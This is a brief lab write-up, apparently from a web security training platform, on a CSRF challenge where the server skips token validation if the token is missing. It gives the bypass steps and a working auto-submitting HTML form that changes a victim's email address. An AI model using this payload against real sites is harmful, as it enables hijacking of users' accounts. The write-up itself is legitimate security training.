# Lab.3: CSRF where token validation depends on token being present

## Challenge

 This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

## Solution

I logged in via `wiener` account and changed the email address.

I sent this `POST` request to the Burp Repeater, and tried to change the email, by modifying the `csrf` token, which gave me a `400 Bad Request`. 

I completely removed the csrf, and it worked, changing my address.

```html
<form action="https://0a1300fc0303313080edb7df00370075.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned334&commat;vatrasec22&period;net" />
</form>
<script>
    document.forms[0].submit();
</script>
```

